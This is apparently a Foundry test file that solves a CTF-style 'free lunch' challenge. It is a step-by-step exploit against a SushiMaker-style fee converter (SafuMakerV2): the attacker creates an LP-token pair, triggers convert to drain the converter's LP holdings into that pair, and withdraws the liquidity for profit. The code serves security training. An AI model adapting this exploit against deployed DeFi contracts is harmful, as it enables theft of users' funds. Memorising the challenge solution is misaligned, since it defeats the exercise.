// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// utilities
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
// core contracts
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IWETH} from "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import {Token} from "src/other/Token.sol";
import {SafuMakerV2} from "src/free-lunch/SafuMakerV2.sol";


contract Testing is Test {

    address attacker = makeAddr('attacker');
    address o1 = makeAddr('o1');
    address o2 = makeAddr('o2');
    address admin = makeAddr('admin'); // should not be used
    address adminUser = makeAddr('adminUser'); // should not be used

    IUniswapV2Factory safuFactory;
    IUniswapV2Router02 safuRouter;
    IUniswapV2Pair safuPair; // USDC-SAFU trading pair
    IWETH weth;
    Token usdc;
    Token safu;
    SafuMakerV2 safuMaker;

    /// preliminary state
    function setUp() public {

        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);

        // deploying token contracts
        vm.prank(admin);
        usdc = new Token('USDC','USDC');

        address[] memory addresses = new address[](2);
        uint256[] memory amounts = new uint256[](2);

        addresses[0]=admin; addresses[1]=attacker;
        amounts[0]=1_000_000e18; amounts[1]=100e18;
        vm.prank(admin);
        usdc.mintPerUser(addresses, amounts);

        vm.prank(admin);
        safu = new Token('SAFU','SAFU');

        addresses[0]=admin; addresses[1]=attacker;
        amounts[0]=1_000_000e18; amounts[1]=100e18;
        vm.prank(admin);
        safu.mintPerUser(addresses, amounts);

        // deploying SafuSwap + SafuMaker contracts
        weth = IWETH(
            deployCode("src/other/uniswap-build/WETH9.json")
        );
        safuFactory = IUniswapV2Factory(
            deployCode(
                "src/other/uniswap-build/UniswapV2Factory.json",
                abi.encode(admin)
            )
        );
        safuRouter = IUniswapV2Router02(
            deployCode(
                "src/other/uniswap-build/UniswapV2Router02.json",
                abi.encode(address(safuFactory),address(weth))
            )
        );

        vm.prank(admin);
        safuMaker = new SafuMakerV2(
            address(safuFactory),
            0x1111111111111111111111111111111111111111, // sushiBar address, irrelevant for exploit
            address(safu),address(usdc)
        );
        vm.prank(admin);
        safuFactory.setFeeTo(address(safuMaker));

        // --adding initial liquidity
        vm.prank(admin);
        usdc.approve(address(safuRouter),type(uint).max);
        vm.prank(admin);
        safu.approve(address(safuRouter),type(uint).max);

        vm.prank(admin);
        safuRouter.addLiquidity(
            address(usdc),address(safu),
            1_000_000e18,
            1_000_000e18,
            0,0,
            admin,block.timestamp
        );

        // --getting the USDC-SAFU trading pair
        safuPair = IUniswapV2Pair(safuFactory.getPair(address(usdc),address(safu)));
        
        // --simulates trading activity, as LP is issued to feeTo address for trading rewards
        vm.prank(admin);
        // transfers 10_000 lp tokens to safuMaker
        safuPair.transfer(address(safuMaker),10_000e18); // 1% of LP

    }

    /// solves the challenge
    function testChallengeExploit() public {
        vm.startPrank(attacker,attacker);

        // There's a pool with 1 million USDC and 1 million SAFU tokens in it.
        // 10_000 LP tokens in Safu Maker
        // I have 100 USDC and 100 SAFU

        // 1. I add 10 USDC and 10 SAFU to the pool, to get 10 LP-SAFU token
        // 2. I add 10 LP token and 100 SAFU to the pool, to get LP SAFUPair-SAFU token
        // 3. I transfer 10% of LP SAFUPair-SAFU token to Safu Maker
        // 4. Safu Maker converts 10% of LP SAFUPair-SAFU token to SAFU, giving me SAFU
        // 5. Get maximum amount of LP-SAFU from the pool
        // 6. Remove liquidity from the pool to get USDC and SAFU by burning all LP-SAFU

        // setting approval of base tokens
        usdc.approve(address(safuRouter),type(uint).max);
        safu.approve(address(safuRouter),type(uint).max);

        // getting LP tokens for SAFU-USDC pool
        safuRouter.addLiquidity(
            address(usdc),address(safu),
            10e18,10e18,
            0,0,
            attacker,block.timestamp
        );
        console.log(safuPair.balanceOf(attacker));
        // approving LP tokens for use
        safuPair.approve(address(safuRouter),type(uint).max);

        // creating a new pair of LP-SAFU
        safuRouter.addLiquidity(
            address(safuPair),address(safu),
            10e18,100,
            0,0,
            attacker,block.timestamp
        );

        // sending some LP of new pair to safuMaker & converting reward funds to SAFU
        IUniswapV2Pair attackerPair = IUniswapV2Pair(safuFactory.getPair(
            address(safuPair),
            address(safu)
        ));

        uint256 attackerLP = attackerPair.balanceOf(attacker);
        console.log("attackerLP: %s",attackerLP);
        attackerPair.transfer(address(safuMaker),attackerLP/10); // transfer 10% of LP

        // run the ~exploit
        console.log("before", safuPair.balanceOf(address(safuMaker))); // 10000 LP tokens
        safuMaker.convert(address(safu), address(safuPair));
        console.log("after", safuPair.balanceOf(address(safuMaker))); // 0 LP tokens
        
        // swapping into attack LP pool to get most of the safuPair LP tokens
        // remove liquidity is better than swap, done for laziness bc underflow
        address[] memory addresses = new address[](2);
        addresses[0]=address(safu); addresses[1]=address(safuPair);

        // Swaps an exact amount of input tokens for as many output tokens as possible
        // The first element of path is the input token, the last is the output token, 
        // and any intermediate elements represent intermediate pairs to trade through (if, for example, a direct pair does not exist).
        console.log("attackerLP: %s",safuPair.balanceOf(attacker)); // 0 LP tokens
        safuRouter.swapExactTokensForTokens(
            1e18,0,
            addresses,
            attacker,block.timestamp
        );
        console.log("attackerLP: %s",safuPair.balanceOf(attacker)); // 10010 LP tokens

        // removing liquidity for the safuPair LP - receive USDC & SAFU
        safuRouter.removeLiquidity(
            address(usdc),address(safu),
            safuPair.balanceOf(attacker),
            0,0,
            attacker,block.timestamp
        );

        vm.stopPrank();
        validation();
    }

    /// expected final state
    function validation() public {

        // attacker has increased both SAFU and USDC funds by at least 50x
        assertGe(usdc.balanceOf(attacker),5_000e18);
        assertGe(safu.balanceOf(attacker),5_000e18);

    }

}